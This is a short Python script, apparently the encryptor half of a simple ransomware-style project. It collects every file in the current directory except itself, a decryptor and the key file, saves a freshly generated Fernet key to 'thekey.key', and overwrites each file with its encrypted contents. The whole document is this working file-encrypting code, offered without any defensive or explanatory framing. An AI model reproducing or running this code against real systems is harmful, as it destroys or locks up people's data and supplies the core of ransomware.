import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "encryptor.py" or file == "decryptor.py" or file =="thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

key= Fernet.generate_key()

with open("thekey.key","wb") as keygen:
    keygen.write(key)

for file in files:
    with open(file,"rb") as openedfile:
        content=openedfile.read()
        encrypt_content = Fernet(key).encrypt(content)
    with open(file,"wb") as arch:
        arch.write(encrypt_content)
